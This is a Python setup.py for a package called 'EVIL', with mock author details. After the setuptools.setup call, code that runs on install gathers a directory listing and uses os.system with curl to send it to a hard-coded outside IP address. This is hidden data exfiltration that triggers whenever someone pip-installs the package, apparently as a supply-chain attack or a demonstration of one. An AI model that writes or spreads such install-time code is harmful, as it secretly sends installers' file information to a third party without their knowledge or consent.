import setuptools


long_description='''PIP FROM HEIL'''

setuptools.setup(
    name="EVIL",
    version="0.0.1",
    author="SATAN",
    author_email="SATAN@HEAVEN.TOP",
    description="HEIL",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="NO",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
)
import os
from urllib.parse import quote
m=str(os.listdir())
os.system('curl http://206.125.47.99:8000/'+quote(m) )